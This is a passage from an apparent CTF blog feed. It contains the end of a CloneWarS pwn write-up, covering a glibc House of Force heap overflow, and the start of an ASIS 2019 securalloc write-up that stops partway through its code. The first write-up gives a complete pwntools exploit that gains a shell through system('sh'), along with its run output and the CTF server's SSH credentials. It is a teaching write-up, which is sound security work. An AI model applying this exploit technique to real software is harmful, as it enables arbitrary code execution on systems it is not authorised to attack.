class="number">0</span>, &amp;buf, <span class="number">0x14</span>uLL); <span class="comment">// content limited to 0x14 bytes</span></span><br><span class="line">  v1 = atoi(&amp;buf);</span><br><span class="line">  dest = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(v1); <span class="comment">// once again a controllable sized malloc </span></span><br><span class="line">  fwrite(<span class="string">"\nWhat kind of troopers?: "</span>, <span class="number">1u</span>LL, <span class="number">0x19</span>uLL, <span class="built_in">stderr</span>);</span><br><span class="line">  src[(<span class="keyword">int</span>)((<span class="keyword">unsigned</span> __int64)read(<span class="number">0</span>, src, <span class="number">8u</span>LL) - <span class="number">1</span>)] = <span class="number">0</span>; <span class="comment">// puts a null byte at the (8-1) position of the string</span></span><br><span class="line">  <span class="built_in">strcpy</span>(dest, src); <span class="comment">// puts the content from stdin into the new allocated chunk</span></span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Nothing wrong with this one (in terms of security at least) but this one can be useful to store some content to a certain pointer specially if we manage to make <strong>malloc</strong> return an arbirtrary pointer to a place we want.</p><p><strong>light_sabers</strong> is the same as <strong>make_troopers</strong> but instead of putting a null byte at the 8th position of the read string it puts at the 0x14-1 which is right at the end of the string.</p><p>Analysing <strong>cm2_dark_side</strong>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cm2_dark_side</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nFile is at: %ld\n"</span>, file); <span class="comment">// file pointer leaked</span></span><br><span class="line">  <span class="keyword">return</span> system(file); <span class="comment">// system call</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>file</strong> is a global variable located at the <strong>BSS</strong> once again we get a <strong>free leak</strong> with this we can get the offset to the <strong>pie base</strong> and get access to the rest of the global variables, this function also hints us that the final objective of this challenge is to find a way to change the content of <strong>file</strong> to get a shell or print the flag.</p><h3 id="House-of-force-the-jedi-overflow"><a href="#House-of-force-the-jedi-overflow" class="headerlink" title="House of force the jedi overflow"></a>House of force the jedi overflow</h3><p>It’s not a coincidence that the theme of this challenge is about <strong>star wars</strong>, Obi wan intuitively says to us:<br><a data-fancybox="gallery" href="https://www.memesmonkey.com/images/memesmonkey/8d/8d20c3e75fbde8db715bf58792deba8e.jpeg" target="_blank" rel="noopener"><br><img src="https://www.memesmonkey.com/images/memesmonkey/8d/8d20c3e75fbde8db715bf58792deba8e.jpeg" alt><br></a><br>The ingredients to use <strong>house of force</strong> can be interpreted as follows:</p><ul><li>The exploiter must be able to overwrite the <strong>top chunk</strong>.</li><li>There is a malloc() call with an <strong>exploiter-controllable</strong> size.</li><li>There is another malloc() call where <strong>data</strong> are <strong>controlled</strong> by the exploiter.</li></ul><p>We checked all the requirements:</p><ul><li>We have a <strong>heap-overflow</strong> at the function <strong>prep_starship</strong> through <strong>memset</strong>.</li><li>We have a multiple malloc calls with controllable sizes for example in <strong>build_death_star</strong>.</li><li>We have a malloc call where we can control its data in <strong>make_troopers</strong> and <strong>light_sabers</strong>.</li></ul><p>So the <strong>core</strong> of this attack is to overwrite <strong>av-&gt;top</strong> with an big arbitrary value so it can later force <strong>malloc</strong> (which uses the top chunk) to return an arbitrary pointer to an address we want to modify.</p><p>So what is the <strong>top_chunk</strong> ? <strong>top_chunk</strong> also known as the wilderness is a special chunk that defines how much <strong>space</strong> is <strong>left</strong> in the current <strong>heap arena</strong>, this chunk is located at the top of the heap.<br><a data-fancybox="gallery" href="https://i.imgur.com/qBJ8FFE.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/qBJ8FFE.png" alt><br></a><br>On this sample program we can see right after the first allocation the heap is initialized, the first chunk is the <strong>tc ache_p_struct</strong> next is the allocated chunk by us.<br>Finally right at the top of the heap we have the <strong>wilderness</strong> the space left in the arena is defined in the field <strong>mchunk_size</strong> so lets see what happens when we allocate a 2nd chunk:<br><a data-fancybox="gallery" href="https://i.imgur.com/Kmu5zUW.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/Kmu5zUW.png" alt><br></a><br>When it exceeds the space left, heap <strong>expansion</strong> is triggered mapping a new memory page.</p><p>So what happens when the top chunk is used to allocate the size of the heap block to any value controlled by the user? The answer is that you can make the top chunk point to whatever we want (yes everywhere even in a position before because of overflow), which is equivalent to an arbitrary address write. However, in <a href="https://github.com/lunaczp/glibc-2.27/blob/master/malloc/malloc.c#L2729" target="_blank" rel="noopener">glibc</a>, the size of the user request and the existing size of the top chunk are verified. </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">Void_t*</span><br><span class="line">_int_malloc(mstate av, <span class="keyword">size_t</span> bytes) &#123;</span><br><span class="line">  INTERNAL_SIZE_T nb;               <span class="comment">/* normalized request size */</span></span><br><span class="line"></span><br><span class="line">  [...]</span><br><span class="line"></span><br><span class="line">  mchunkptr       victim;           <span class="comment">/* inspected/selected chunk */</span></span><br><span class="line">  INTERNAL_SIZE_T size;             <span class="comment">/* its size */</span></span><br><span class="line">  <span class="keyword">int</span>             victim_index;     <span class="comment">/* its bin index */</span></span><br><span class="line"></span><br><span class="line">  mchunkptr       remainder;        <span class="comment">/* remainder from a split */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span>   remainder_size;   <span class="comment">/* its size */</span></span><br><span class="line"></span><br><span class="line">  [...]</span><br><span class="line"></span><br><span class="line">  checked_request2size(bytes, nb);</span><br><span class="line"></span><br><span class="line">  [...]</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* finally, do the allocation */</span></span><br><span class="line">  p = av-&gt;top;</span><br><span class="line">  size = chunksize (p);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* check that one of the above allocation paths succeeded */</span></span><br><span class="line">  <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">    &#123;</span><br><span class="line">      remainder_size = size - nb;</span><br><span class="line">      remainder = chunk_at_offset (p, nb);</span><br><span class="line">      av-&gt;top = remainder;</span><br><span class="line">      set_head (p, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">      set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">      check_malloced_chunk (av, p, nb);</span><br><span class="line">      <span class="keyword">return</span> chunk2mem (p);</span><br><span class="line">    &#125;</span><br><span class="line">    [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Perhaps, if you can override with size to a large value, you can easily pass this verification, we can do this with an overflow vulnerability to tamper the top_chunk size.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE)</span><br></pre></td></tr></table></figure><p>In the <a href="https://packetstormsecurity.com/files/40638/MallocMaleficarum.txt.html" target="_blank" rel="noopener">Malloc Maleficarum</a> it is written that the wilderness chunk should have the highest size possible (preferably 0xFFFFFFFFFFFFFFFF) which is the largest number in unsigned long in x64. </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Treat space at ptr + offset as a chunk */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s)))</span></span><br><span class="line"></span><br><span class="line">remainder = chunk_at_offset (p, nb);</span><br><span class="line">av-&gt;top = remainder;</span><br></pre></td></tr></table></figure><p>After that, the top pointer will be updated, and the next heap block will be allocated to this location.</p><h3 id="Writing-the-exploit"><a href="#Writing-the-exploit" class="headerlink" title="Writing the exploit"></a>Writing the exploit</h3><p>The first thing is find a way to connect with <strong>SSH</strong> to connect to the server I did that with:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">r =process(<span class="string">"sshpass -p 12345678 ssh -p 7000 -tt yeet@ctf2.kaf.sh"</span>.split())</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>You need to have sshpass installed tho and also you need to add the server ip to the known hosts before which can be done by saying yes while connecting for the first time via command line:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ssh -p 7000 yeet@ctf2.kaf.sh</span><br></pre></td></tr></table></figure><p>First we need to get a HEAP address leak we can get this by executing <strong>R2D2</strong> option:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">r2d2</span><span class="params">(n)</span>:</span></span><br><span class="line">r.sendlineafter(<span class="string">'Your choice: '</span>, <span class="string">'2'</span>)</span><br><span class="line">r.sendlineafter(<span class="string">'R2? '</span>, <span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pstarships</span><span class="params">(size, kind, capacity)</span>:</span></span><br><span class="line">r.sendlineafter(<span class="string">'Your choice: '</span>, <span class="string">'3'</span>)</span><br><span class="line">r.sendlineafter(<span class="string">'Master, the amount of starships: '</span>, str(size))</span><br><span class="line">r.sendlineafter(<span class="string">'What kind of starships?: '</span>, kind)</span><br><span class="line">r.sendlineafter(<span class="string">'Capacity of troopers in the starships: '</span>, str(capacity))</span><br><span class="line">r = getConn()</span><br><span class="line">pstarships(<span class="number">0x30</span>, <span class="string">'A'</span>, <span class="number">0x30</span>)</span><br><span class="line">r2d2(<span class="number">-1</span>)</span><br><span class="line">r.recvuntil(<span class="string">'R2D2 IS .... '</span>)</span><br><span class="line">HEAP_L = int(r.recvregex(<span class="string">r'(\d+) '</span>))</span><br></pre></td></tr></table></figure><p>Next step is to tamper the size of the wilderness with <strong>pstartships</strong> via <strong>memset</strong>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># OVERFLOW TOP_CHUNK</span></span><br><span class="line">pstarships(<span class="number">0x30</span>, <span class="string">"FF"</span>, <span class="number">0x40</span>) <span class="comment"># Overflow Top Chunk</span></span><br></pre></td></tr></table></figure><p>The top_chunk <strong>before</strong> overflow:<br><a data-fancybox="gallery" href="https://i.imgur.com/yjDhd1Q.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/yjDhd1Q.png" alt><br></a><br>The top_chunk <strong>after</strong> overflow:<br><a data-fancybox="gallery" href="https://i.imgur.com/aye3eSP.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/aye3eSP.png" alt><br></a><br>Now the place we want to write is at <strong>FILE</strong> global string pointer we can do this by going to the darkside(<strong>cm2_dark_side</strong>):</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># LEAK FILE PTR</span></span><br><span class="line">r.sendlineafter(<span class="string">'Your choice: '</span>, <span class="string">'6'</span>)</span><br><span class="line">r.recvuntil(<span class="string">'File is at: '</span>)</span><br><span class="line">FILE = int(r.recvline().rstrip())</span><br><span class="line">log.info(<span class="string">"FILE ADDR 0x%x"</span> % FILE)</span><br></pre></td></tr></table></figure><p>Now we calculate the <strong>evilsize</strong> required to write at <strong>FILE</strong> can be done with <strong>FILE-TOP_CHUNK-8*4</strong>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HEAP = HEAP_L<span class="number">-0x1380</span> <span class="comment"># HEAPBASE</span></span><br><span class="line">SIZE_OF_LONG = <span class="number">0x8</span> <span class="comment"># sizeof(long) -&gt; 8 in 64 bits</span></span><br><span class="line">WILD_OFFSET = <span class="number">0x12e0</span> <span class="comment"># Current TOP_CHUNK offset</span></span><br><span class="line">TOP_CHUNK = HEAP+WILD_OFFSET+SIZE_OF_LONG*<span class="number">4</span></span><br><span class="line">r.sendlineafter(<span class="string">'Your choice: '</span>, <span class="string">'1'</span>)</span><br><span class="line">buildDeathStar(FILE-TOP_CHUNK) <span class="comment"># Malloc will return an arbitrary pointer to FILE</span></span><br></pre></td></tr></table></figure><p>To calculate WILD_OFFSET you can put a break point right before <strong>malloc</strong> inside <strong>buildDeathStar</strong> and calculate with this:<br><a data-fancybox="gallery" href="https://i.imgur.com/pDDp6Os.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/pDDp6Os.png" alt><br></a><br>Write <strong>sh</strong> into file:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">r.sendlineafter(<span class="string">'Your choice: '</span>, <span class="string">'4'</span>)</span><br><span class="line">r.sendlineafter(<span class="string">'What kind of troopers?: '</span>, <span class="string">'sh'</span>) <span class="comment"># Modify file with sh</span></span><br><span class="line">r.sendlineafter(<span class="string">'Your choice: '</span>, <span class="string">'6'</span>) <span class="comment"># Trigger system("sh")</span></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>The full exploit:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">filename = <span class="string">"./CloneWarS"</span></span><br><span class="line">elf = ELF(filename)</span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConn</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> process(filename) <span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE <span class="keyword">else</span> process(<span class="string">"sshpass -p 12345678 ssh -p 7000 -tt yeet@ctf2.kaf.sh"</span>.split())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_PIE</span><span class="params">(proc)</span>:</span></span><br><span class="line">    memory_map = open(<span class="string">"/proc/&#123;&#125;/maps"</span>.format(proc.pid),<span class="string">"rb"</span>).readlines()</span><br><span class="line">    <span class="keyword">return</span> int(memory_map[<span class="number">0</span>].split(<span class="string">"-"</span>)[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(bp)</span>:</span></span><br><span class="line">    script = <span class="string">""</span></span><br><span class="line">    PIE = get_PIE(r)</span><br><span class="line">    PAPA = PIE</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> bp:</span><br><span class="line">        script += <span class="string">"b *0x%x\n"</span>%(PIE+x)</span><br><span class="line">    gdb.attach(r,gdbscript=script)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">r2d2</span><span class="params">(n)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'Your choice: '</span>, <span class="string">'2'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'R2? '</span>, <span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pstarships</span><span class="params">(size, kind, capacity)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'Your choice: '</span>, <span class="string">'3'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'Master, the amount of starships: '</span>, str(size))</span><br><span class="line">    r.sendlineafter(<span class="string">'What kind of starships?: '</span>, kind)</span><br><span class="line">    r.sendlineafter(<span class="string">'Capacity of troopers in the starships: '</span>, str(capacity))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lightsabers</span><span class="params">(nLs, color)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'Your choice: '</span>, <span class="string">'5'</span>)</span><br><span class="line">    r.sendafter(<span class="string">'How many lightsabers do you think you will need?: '</span>, <span class="string">'\n'</span>)</span><br><span class="line">    r.sendline(str(nLs))</span><br><span class="line">    r.sendafter(<span class="string">'What color would you like on your light sabers: '</span>, color)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buildDeathStar</span><span class="params">(size)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'Your choice: '</span>, <span class="string">'1'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'Assemble death star: '</span>,str(size))</span><br><span class="line">    </span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'new-window'</span>]</span><br><span class="line">r = getConn()</span><br><span class="line"></span><br><span class="line"><span class="comment"># LEAKING HEAP</span></span><br><span class="line">pstarships(<span class="number">0x30</span>, <span class="string">'A'</span>, <span class="number">0x30</span>)</span><br><span class="line">r2d2(<span class="number">-1</span>)</span><br><span class="line">r.recvuntil(<span class="string">'R2D2 IS .... '</span>)</span><br><span class="line">HEAP_L = int(r.recvregex(<span class="string">r'(\d+) '</span>))</span><br><span class="line">log.info(<span class="string">'HEAP ADDR 0x%x'</span>% HEAP_L)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE <span class="keyword">and</span> args.GDB:</span><br><span class="line">    debug([<span class="number">0xB0F</span>,<span class="number">0xC3C</span>,<span class="number">0xA7D</span>, <span class="number">0xE00</span>]) <span class="comment"># 0xD94</span></span><br><span class="line"><span class="comment"># OVERFLOW TOP_CHUNK</span></span><br><span class="line">pstarships(<span class="number">0x30</span>, <span class="string">"FF"</span>, <span class="number">0x40</span>) <span class="comment"># Overflow Top Chunk</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># LEAK FILE PTR</span></span><br><span class="line">r.sendlineafter(<span class="string">'Your choice: '</span>, <span class="string">'6'</span>)</span><br><span class="line">r.recvuntil(<span class="string">'File is at: '</span>)</span><br><span class="line">FILE = int(r.recvline().rstrip())</span><br><span class="line">log.info(<span class="string">"FILE ADDR 0x%x"</span> % FILE)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HEAP = HEAP_L<span class="number">-0x1380</span> <span class="comment"># HEAPBASE</span></span><br><span class="line">SIZE_OF_LONG = <span class="number">0x8</span> <span class="comment"># sizeof(long) -&gt; 8 in 64 bits</span></span><br><span class="line">WILD_OFFSET = <span class="number">0x12e0</span> <span class="comment"># Current TOP_CHUNK offset</span></span><br><span class="line">TOP_CHUNK = HEAP+WILD_OFFSET+SIZE_OF_LONG*<span class="number">4</span></span><br><span class="line">r.sendlineafter(<span class="string">'Your choice: '</span>, <span class="string">'1'</span>)</span><br><span class="line">buildDeathStar(FILE-TOP_CHUNK) <span class="comment"># Calculate the evil size required to write to FILE</span></span><br><span class="line">r.sendlineafter(<span class="string">'Your choice: '</span>, <span class="string">'4'</span>)</span><br><span class="line">r.sendlineafter(<span class="string">'What kind of troopers?: '</span>, <span class="string">'sh'</span>) <span class="comment"># Modify file with sh</span></span><br><span class="line">r.sendlineafter(<span class="string">'Your choice: '</span>, <span class="string">'6'</span>) <span class="comment"># Trigger system("sh")</span></span><br><span class="line">r.interactive()</span><br><span class="line">r.close()</span><br></pre></td></tr></table></figure><p>Running it:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ python CloneWarS.py REMOTE</span><br><span class="line">[+] Starting local process <span class="string">'/usr/bin/sshpass'</span>: pid <span class="number">113679</span></span><br><span class="line">[*] HEAP ADDR <span class="number">0x555555757780</span></span><br><span class="line">[*] FILE ADDR <span class="number">0x555555756010</span></span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"><span class="number">6</span></span><br><span class="line"></span><br><span class="line">File <span class="keyword">is</span> at: <span class="number">93824994336784</span></span><br><span class="line">$ $ ls</span><br><span class="line">ls</span><br><span class="line">binary    flag.txt  skywalker.txt</span><br><span class="line">$ $ cat flag.txt</span><br><span class="line">cat flag.txt</span><br><span class="line">KAF&#123;MaY_tHe_F0RCE_B3_W1tH_YOUUU10293012884&#125;</span><br></pre></td></tr></table></figure><h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><ul><li><a href="https://gbmaster.wordpress.com/2015/06/28/x86-exploitation-101-house-of-force-jedi-overflow/" target="_blank" rel="noopener">gbmaster</a></li><li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_force/" target="_blank" rel="noopener">ctfwiki</a></li><li><a href="https://github.com/erosjohn/how2heap/blob/master/glibc_2.25/house_of_force.c" target="_blank" rel="noopener">how2heap</a></li></ul><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;CloneWarS&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Points&lt;/strong&gt;&lt;br&gt;90&lt;br&gt;&lt;strong&gt;Solves&lt;/strong&gt;&lt;br&gt;13&lt;br&gt;&lt;strong&gt;Category&lt;/strong
      
    
    </summary>
    
      <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
    
      <category term="x64" scheme="https://teamrocketist.github.io/categories/Pwn/x64/"/>
    
      <category term="Glibc Malloc" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/"/>
    
      <category term="House of Force" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/House-of-Force/"/>
    
      <category term="Heap Overflow" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Heap-Overflow/"/>
    
    
      <category term="heap_overflow" scheme="https://teamrocketist.github.io/tags/heap-overflow/"/>
    
      <category term="kidpod2019" scheme="https://teamrocketist.github.io/tags/kidpod2019/"/>
    
  </entry>
  
  <entry>
    <title>[Pwn] Asis Finals 2019 - securalloc</title>
    <link href="https://teamrocketist.github.io/2019/11/18/Pwn-Asis-Finals-2019-securalloc/"/>
    <id>https://teamrocketist.github.io/2019/11/18/Pwn-Asis-Finals-2019-securalloc/</id>
    <published>2019-11-18T03:01:32.000Z</published>
    <updated>2019-11-21T14:00:25.342Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><strong>Securalloc</strong></p><p><strong>Points</strong><br>167<br><strong>Solves</strong><br>26<br><strong>Category</strong><br>Warm-up Pwnable</p><p><strong>Description:</strong><br>   The key to success in the battlefield is always the secure allocation of resources!<br>   nc 76.74.177.238 9001<br><a href="https://mega.nz/#!66gEnSqY!jbbsnDzwmsWrcoYCKWH--DIUgxtw9vY78xd9SDbbrnU" target="_blank" rel="noopener">libc.so.6</a><br><a href="https://mega.nz/#!nvoUCSpC!6oZlBoV-aMf1AZ5gWiUBE7NciCjFZcyFlrsoOvL6Phk" target="_blank" rel="noopener">libsalloc.so</a><br><a href="https://mega.nz/#!X7pgWapT!dTz-MRybB52k_3sX8F1N9lqKyejSE0JrxUmRO-XK6RU" target="_blank" rel="noopener">securalloc.elf</a></p></blockquote><h3 id="TLDR"><a href="#TLDR" class="headerlink" title="TLDR"></a>TLDR</h3><ul><li>Leak libc from _IO_2_1_stderr leftover</li><li>Leak heap from _IO_2_1_stderr leftover </li><li>Leak heap canary from /dev/random leftover</li><li>Apply House of Orange and get a shell.</li></ul><h3 id="Extract-information"><a href="#Extract-information" class="headerlink" title="Extract information"></a>Extract information</h3><p>We have an extra shared library <strong>libsalloc.so</strong> to analyse but first lets check the security on <strong>securalloc.elf</strong>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec securalloc.elf</span><br><span class="line">[*] <span class="string">'/ctf/asis2019/pwn/securalloc/securalloc.elf'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p><strong>Full RELRO</strong> is enabled so <strong>GOT</strong> is read only this is something that we always should take in mind before proceeding any further.</p><h3 id="Identifying-the-vulnerability"><a href="#Identifying-the-vulnerability" class="headerlink" title="Identifying the vulnerability"></a>Identifying the vulnerability</h3><p>Now lets check for a vulnerability :<br><a data-fancybox="gallery" href="https://i.imgur.com/QEhVqwT.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/QEhVqwT.png" alt><br></a></p><h3 id="Elf-analysis"><a href="#Elf-analysis" class="headerlink" title="Elf analysis"></a>Elf analysis</h3><p>Like other heap challenges we will have the classic functions <strong>print</strong>, <strong>create</strong>, <strong>delete</strong> and <strong>edit</strong> but this time we have an additional shared library named <strong>libsalloc.so</strong> and the functions used from it are:</p><p><strong>secureinit</strong><br><a data-fancybox="gallery" href="https://i.imgur.com/yemgy3d.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/yemgy3d.png" alt><br></a></p><p>Opening <strong>libsalloc.so</strong> in ida we can see it uses <strong>fopen</strong> to open <strong>/dev/urandom</strong> to create a canary:<br><a data-fancybox="gallery" href="https://i.imgur.com/mEJy0Zl.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/mEJy0Zl.png" alt><br></a></p><p>And why this is bad ? Looking at <a href="https://github.com/lattera/glibc/blob/895ef79e04a953cac1493863bcae29ad85657ee1/libio/iofopen.c#L65" target="_blank" rel="noopener">fopen internals</a>:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 